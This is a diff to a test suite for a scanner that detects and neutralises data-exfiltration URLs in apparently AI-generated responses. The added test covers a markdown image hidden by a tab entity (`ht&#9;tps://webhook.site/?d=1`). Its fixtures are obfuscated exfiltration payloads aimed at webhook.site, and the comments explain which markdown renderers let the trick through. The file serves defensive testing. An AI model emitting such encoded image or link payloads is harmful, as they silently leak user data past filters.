@@ -256,6 +256,22 @@ describe('encoded destinations (#580)', () => {
     expect(found('<img src="https://web\nhook.site/?d=1">')).toEqual(['html-image'])
   })
 
+  // A tab written as an entity inside a markdown destination. marked 15 copies
+  // `&#9;` into the src as it stands, the browser decodes it and the URL parser
+  // strips the tab, so `ht&#9;tps://webhook.site` is fetched from webhook.site.
+  // markdown-it 14, commonmark 0.31 and micromark 4 render it percent-encoded
+  // (`ht%09tps:`), a same-site path. The scanner reads it as marked does.
+  // A literal tab inside `<...>` is percent-encoded by all four (checked for
+  // #580), so it never reaches a host and is not flagged here.
+  it('reads a tab entity in a markdown destination, as marked renders it', () => {
+    expect(found('![x](ht&#9;tps://webhook.site/?d=1)')).toEqual(['markdown-image'])
+    expect(found('[x](https://web&#x9;hook.site/?d=1)')).toEqual(['markdown-link'])
+    const body = JSON.stringify({ content: [{ type: 'text', text: '![x](ht&#9;tps://webhook.site/?d=1)' }] })
+    const f = scanResponseExfil(body, isExfil)
+    expect(f.map(x => x.kind)).toEqual(['markdown-image'])
+    expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
+  })
+
   it('reads an entity-encoded reference definition', () => {
     expect(found('[r]: https&#58;//webhook.site/?d=1')).toEqual(['markdown-image'])
   })
